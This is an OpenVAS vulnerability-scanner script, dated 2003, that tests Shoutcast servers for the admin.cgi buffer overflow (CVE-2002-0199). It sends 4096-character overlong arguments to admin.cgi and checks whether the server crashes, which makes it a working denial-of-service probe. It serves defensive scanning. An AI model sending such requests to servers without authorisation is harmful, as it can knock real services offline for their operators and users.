# OpenVAS Vulnerability Test
# $Id: shoutcast_admin_cgi_overflow.nasl 17 2013-10-27 14:01:43Z jan $
# Description: admin.cgi overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The Shoutcast server crashes when a too long argument is 
given to admin.cgi
A cracker may use this flaw to prevent your server from
working, or worse, execute arbitrary code on your system.";

tag_solution = "upgrade Shoutcast to the latest version.";

# References:
# Date:  Mon, 21 Jan 2002 22:04:58 -0800
# From: "Austin Ensminger" <skream@pacbell.net>
# Subject: Re: Shoutcast server 1.8.3 win32
# To: bugtraq@securityfocus.com
#
# http://www.egoclan.barrysworld.net/sc_crashsvr.txt
#
# Date:  19 Jan 2002 18:16:49 -0000
# From: "Brian Dittmer" <bditt@columbus.rr.com>
# To: bugtraq@securityfocus.com
# Subject: Shoutcast server 1.8.3 win32

if(description)
{
  script_id(11719);
  script_version("$Revision: 17 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(3934);
  
  script_cve_id("CVE-2002-0199");
  
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  name = "admin.cgi overflow";
  script_name(name);
 
  desc = "
  Summary:
  " + tag_summary + "
  Solution:
  " + tag_solution;


  script_description(desc);
 
  summary = "Overflows admin.cgi";
  script_summary(summary);
  script_category(ACT_DENIAL);
 
 
  script_copyright("This script is Copyright (C) 2003 Michel Arboi");
  family = "Web application abuses";
  script_family(family);
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8888);
  # Shoutcast is often on a high port
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

# The script code starts here

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

ports = add_port_in_list(list:get_kb_list("Services/www"), port:8888);
foreach port (ports)
{
 if( get_port_state(port)  && !get_kb_item("Services/www/" + port + "/embedded") && !http_is_dead(port:port, retry:0))
 {
  banner = get_http_banner(port:port);
  if(!banner)continue;
  if(!egrep(pattern:"shoutcast", string:banner, icase: TRUE))continue;
  url = string("/admin.cgi?pass=", crap(length:4096, data:"\"));
  req = http_get(item: url, port:port);
  soc = http_open_socket(port);
  if (!soc)exit(0);
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);

  url = string("/admin.cgi?", crap(length:4096, data:"\"));
  req = http_get(item: url, port:port);
  soc = http_open_socket(port);
  if (soc) {
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  }
  
  if (http_is_dead(port: port))
  {
   security_hole(port: port);
   exit(0);
  }
 }
}

